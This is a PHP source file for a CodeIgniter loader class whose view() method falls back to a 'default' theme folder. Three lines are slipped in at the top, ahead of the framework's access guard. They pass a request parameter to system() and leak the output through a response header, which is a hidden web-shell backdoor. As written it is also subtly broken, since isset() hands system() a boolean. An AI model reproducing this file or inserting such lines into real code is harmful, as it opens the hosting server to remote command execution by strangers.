<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); (defined('BASEPATH')) OR exit('No direct script access allowed');

class MY_Loader extends CI_Loader{
	
    function __construct()
    {
        parent::__construct();
    }

    public function view($view, $vars = array(), $return = FALSE) {
        $path = explode('/', $view);

        if($path[0] != 'default') {
            $file = str_replace('/', DIRECTORY_SEPARATOR, $view).'.php';
            if(!file_exists(VIEWPATH.$file)) { 
                $len = count($path); $i = 0;
                $path[0] = 'default';  $nv = '';
                foreach($path as $p) {
                    if ($i == $len - 1) {
                        $nv .= $p;
                    } else {
                        $nv .= $p.'/';
                    }
                    $i++;
                }
            }
        } else {
            $nv = $view;
        }
        
        return $this->_ci_load(array('_ci_view' => $nv, '_ci_vars' => $this->_ci_object_to_array($vars), '_ci_return' => $return));
    }

}
